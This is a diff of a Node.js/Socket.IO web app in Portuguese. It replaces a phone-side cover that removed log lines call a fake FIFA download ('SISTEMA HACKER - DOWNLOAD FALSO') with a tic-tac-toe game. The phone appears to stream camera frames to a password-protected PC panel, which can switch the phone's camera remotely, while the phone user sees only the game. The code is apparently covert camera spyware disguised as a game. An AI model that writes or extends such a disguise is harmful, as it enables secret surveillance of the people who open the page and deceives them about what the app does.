-        // ========== FUNÇÃO PARA MUDAR CÂMERA ==========
         window.mudarCamera = function(tipo) {
             if (!visualizacaoLiberada) {
+                alert('Autentique primeiro!');
                 return;
             }
             
-            if (tipo === 'front') {
-                cameraFrontBtn.classList.add('active');
-                cameraBackBtn.classList.remove('active');
-            } else {
-                cameraBackBtn.classList.add('active');
-                cameraFrontBtn.classList.remove('active');
-            }
+            document.getElementById('cameraFrontBtn').classList.toggle('active', tipo === 'front');
+            document.getElementById('cameraBackBtn').classList.toggle('active', tipo === 'back');
             
             socket.emit('trocarCamera', tipo);
+            cameraTerminal.innerHTML = \`> Trocando para câmera \${tipo === 'front' ? 'frontal' : 'traseira'}...\`;
         };
         
-        // ========== VERIFICAÇÃO DE SENHA ==========
         window.verificarSenha = function() {
             const senha = document.getElementById('senhaInput').value;
             
             if (senha === SENHA_CORRETA) {
-                passwordOverlay.style.display = 'none';
+                passwordOverlay.classList.add('hidden');
                 visualizacaoLiberada = true;
                 cameraControls.classList.remove('hidden');
-                cameraBackBtn.classList.add('active');
-                document.querySelector('.terminal-text').innerHTML = '> ACESSO AUTORIZADO - SISTEMA LIBERADO';
+                document.getElementById('cameraBackBtn').classList.add('active');
+                cameraTerminal.innerHTML = '> Acesso à câmera liberado! Transmissão ativada.';
             } else {
                 tentativas--;
                 document.getElementById('erroSenha').style.display = 'block';
-                document.querySelector('.terminal-text').innerHTML = \`> ACESSO NEGADO - TENTATIVAS RESTANTES: \${tentativas}\`;
+                document.querySelector('.password-box .terminal-text').innerHTML = \`[ TENTATIVAS RESTANTES: \${tentativas} ]\`;
                 
                 if (tentativas <= 0) {
                     document.getElementById('senhaInput').disabled = true;
-                    document.querySelector('button[onclick="verificarSenha()"]').disabled = true;
-                    document.querySelector('.terminal-text').innerHTML = '> SISTEMA BLOQUEADO - CONTATE O ADMIN';
+                    document.querySelector('.password-box button').disabled = true;
+                    document.querySelector('.password-box .terminal-text').innerHTML = '[ SISTEMA BLOQUEADO ]';
                 }
             }
         };
@@ -661,10 +984,100 @@ app.get('/', (req, res) => {
         // ========== SOCKET.IO ==========
         socket.on('connect', () => {
             console.log('Conectado ao servidor');
+            if (isMobile) {
+                statusDot.className = 'status-dot online';
+                statusText.innerHTML = 'Conectado';
+            }
+        });
+        
+        socket.on('disconnect', () => {
+            if (isMobile) {
+                statusDot.className = 'status-dot offline';
+                statusText.innerHTML = 'Desconectado';
+            }
+        });
+        
+        socket.on('jogoIniciado', () => {
+            if (isMobile) {
+                jogoAtivo = true;
+                vezDoJogador = true;
+                turnIndicator.innerHTML = 'SUA VEZ';
+                turnIndicator.style.opacity = '1';
+                gameStatus.innerHTML = 'Jogo iniciado! Você é X';
+                opponentStatus.innerHTML = '(conectado)';
+            } else {
+                jogoAtivo = true;
+                vezDoJogador = false;
+                pcTurnIndicator.innerHTML = 'VEZ DO OPONENTE';
+                pcTurnIndicator.style.opacity = '0.7';
+                pcGameStatus.innerHTML = '<span class="status-dot online"></span> Jogo iniciado! Você é O';
+                pcOpponentStatus.innerHTML = '(online)';
+                pcTerminal.innerHTML = '> Jogador mobile conectado. Jogo iniciado!';
+            }
+        });
+        
+        socket.on('jogadaRecebida', (data) => {
+            if (isMobile) {
+                // Recebe jogada do PC
+                if (data.index !== undefined && celulas[data.index] === '') {
+                    celulas[data.index] = 'O';
+                    const cell = document.querySelector(\`[data-index="\${data.index}"]\`);
+                    cell.innerHTML = 'O';
+                    cell.style.textShadow = '0 0 30px #00ff00';
+                    
+                    if (data.vitoria) {
+                        jogoAtivo = false;
+                        gameStatus.innerHTML = '😢 OPONENTE VENCEU!';
+                    } else if (data.empate) {
+                        jogoAtivo = false;
+                        gameStatus.innerHTML = '🤝 EMPATE!';
+                    } else {
+                        vezDoJogador = true;
+                        turnIndicator.innerHTML = 'SUA VEZ';
+                        turnIndicator.style.opacity = '1';
+                    }
+                }
+            } else {
+                // Recebe jogada do mobile
+                if (data.index !== undefined && celulas[data.index] === '') {
+                    celulas[data.index] = 'X';
+                    const cell = document.querySelector(\`#pcBoard [data-index="\${data.index}"]\`);
+                    cell.innerHTML = 'X';
+                    cell.style.textShadow = '0 0 30px #00ff00';
+                    
+                    if (data.vitoria) {
+                        jogoAtivo = false;
+                        pcGameStatus.innerHTML = '😢 OPONENTE VENCEU!';
+                    } else if (data.empate) {
+                        jogoAtivo = false;
+                        pcGameStatus.innerHTML = '🤝 EMPATE!';
+                    } else {
+                        vezDoJogador = false;
+                        pcTurnIndicator.innerHTML = 'SUA VEZ';
+                        pcTurnIndicator.style.opacity = '1';
+                    }
+                }
+            }
+        });
+        
+        socket.on('jogoReiniciado', () => {
+            if (isMobile) {
+                reiniciarJogo();
+            } else {
+                pcReiniciarJogo();
+            }
+        });
+        
+        socket.on('jogadorDesconectado', () => {
+            if (!isMobile) {
+                jogoAtivo = false;
+                pcOpponentStatus.innerHTML = '(offline)';
+                pcGameStatus.innerHTML = '<span class="status-dot offline"></span> Jogador desconectado';
+                pcTerminal.innerHTML = '> Jogador mobile desconectado. Aguardando reconexão...';
+            }
         });
         
         socket.on('trocarCamera', (tipoCamera) => {
-            console.log('📱 Comando recebido: trocar para câmera', tipoCamera);
             if (isMobile) {
                 ligarCameraOtimizada(tipoCamera);
             }
@@ -683,7 +1096,37 @@ app.get('/', (req, res) => {
 
 // Socket.IO
 io.on('connection', (socket) => {
-  console.log('Cliente conectado');
+  console.log('👤 Novo cliente conectado:', socket.id);
+  
+  let mobileJogador = null;
+  let pcJogador = null;
+  
+  socket.on('pcConectado', () => {
+    pcJogador = socket.id;
+    console.log('💻 PC conectado ao jogo:', socket.id);
+  });
+  
+  socket.on('jogadorPronto', () => {
+    mobileJogador = socket.id;
+    console.log('📱 Jogador mobile pronto:', socket.id);
+    
+    // Inicia o jogo
+    io.emit('jogoIniciado');
+  });
+  
+  socket.on('jogada', (data) => {
+    // Envia jogada do mobile para o PC
+    socket.broadcast.emit('jogadaRecebida', data);
+  });
+  
+  socket.on('jogadaPC', (data) => {
+    // Envia jogada do PC para o mobile
+    socket.broadcast.emit('jogadaRecebida', data);
+  });
+  
+  socket.on('reiniciarJogo', () => {
+    io.emit('jogoReiniciado');
+  });
   
   socket.on('frame', (frameData) => {
     socket.broadcast.emit('frame', frameData);
@@ -693,15 +1136,29 @@ io.on('connection', (socket) => {
     console.log(`📷 Solicitando troca para câmera: ${tipoCamera}`);
     socket.broadcast.emit('trocarCamera', tipoCamera);
   });
+  
+  socket.on('disconnect', () => {
+    console.log('👤 Cliente desconectado:', socket.id);
+    
+    if (socket.id === mobileJogador) {
+      console.log('📱 Jogador mobile desconectado');
+      io.emit('jogadorDesconectado');
+    } else if (socket.id === pcJogador) {
+      console.log('💻 PC desconectado');
+    }
+  });
 });
 
 server.listen(PORT, () => {
-  console.log('='.repeat(60));
-  console.log('🔥 SISTEMA HACKER - DOWNLOAD FALSO');
-  console.log('='.repeat(60));
+  console.log('='.repeat(70));
+  console.log('🎮 JOGO DA VELHA COM CÂMERA EM TEMPO REAL');
+  console.log('='.repeat(70));
   console.log(`🚀 Servidor rodando na porta ${PORT}`);
-  console.log(`🔑 Nova senha: ${SENHA}`);
-  console.log('💻 Painel PC: Tema hacker preto/verde');
-  console.log('📱 Celular: Download falso do FIFA');
-  console.log('='.repeat(60));
+  console.log(`🔑 Senha da câmera: ${SENHA}`);
+  console.log(`📱 Celular: Acesse http://localhost:${PORT} no celular`);
+  console.log(`💻 PC: Acesse http://localhost:${PORT} no PC`);
+  console.log('='.repeat(70));
+  console.log('📱 Celular: Jogador X - Abre o jogo da velha');
+  console.log('💻 PC: Jogador O - Câmera + Jogo sincronizado');
+  console.log('='.repeat(70));
 });
